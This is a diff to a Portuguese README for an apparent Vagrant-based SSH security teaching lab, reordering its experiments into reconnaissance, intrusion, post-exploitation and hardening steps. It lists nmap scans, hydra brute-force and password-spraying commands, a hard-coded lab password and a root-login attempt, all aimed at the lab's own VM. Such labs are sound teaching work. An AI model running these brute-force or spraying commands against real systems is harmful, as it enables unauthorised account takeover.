@@ -54,42 +54,56 @@ vagrant ssh def-weak    # Máquina vulnerável
 
 ## 🧪 Experimentos
 
-### 1. Descoberta de Rede
+### 1. Reconhecimento - Descoberta de Rede
 ```bash
-# Descobrir hosts ativos
+# Descobrir hosts ativos na rede
 sudo nmap -sn 192.168.56.0/24
 
-# Scan de portas SSH
-sudo nmap -sS -sV -p 22 <ip-alvo>
+# Scan detalhado do alvo encontrado
+sudo nmap -sS -sV -p 22 192.168.56.10
 ```
 
-### 2. Auditoria SSH
-```bash
-ssh-audit <ip-alvo>
-```
-
-### 3. Teste de Acesso
-```bash
-ssh prof@192.168.56.10
-# Senha: Prof123
-```
-
-### 4. Força Bruta
+### 2. Invasão - Força Bruta SSH
 ```bash
 # Ataque com wordlist de senhas comuns
 hydra -l prof -P /vagrant/wordlists/senhas-comuns.txt -t 4 192.168.56.10 ssh
 ```
 
-### 5. Análise de Logs
+### 3. Invasão - Password Spraying
 ```bash
-# Na VM def-weak
+# Testar 1 senha comum em múltiplos usuários (evita bloqueio)
+hydra -L /vagrant/wordlists/usuarios-comuns.txt -p Prof123 -t 4 192.168.56.10 ssh
+```
+
+### 4. Invasão - Acesso Direto com Credenciais
+```bash
+# Após descobrir a senha, acessar o sistema
+ssh prof@192.168.56.10
+# Senha: Prof123
+```
+
+### 5. Invasão - Exploração de Root Login
+```bash
+# Tentar acesso direto como root (se habilitado)
+ssh root@192.168.56.10
+```
+
+### 6. Pós-Exploração - Análise de Logs
+```bash
+# Na VM def-weak, verificar rastros do ataque
 sudo journalctl -u ssh --since "-15 min"
 sudo tail -f /var/log/auth.log
 ```
 
-### 6. Hardening (Opcional)
+### 7. Auditoria - Identificar Vulnerabilidades
 ```bash
-# Na VM atacante
+# Auditar configurações SSH
+ssh-audit 192.168.56.10
+```
+
+### 8. Defesa - Hardening (Opcional)
+```bash
+# Aplicar correções de segurança
 cd /vagrant/scripts
 ./hardening.sh
 ```
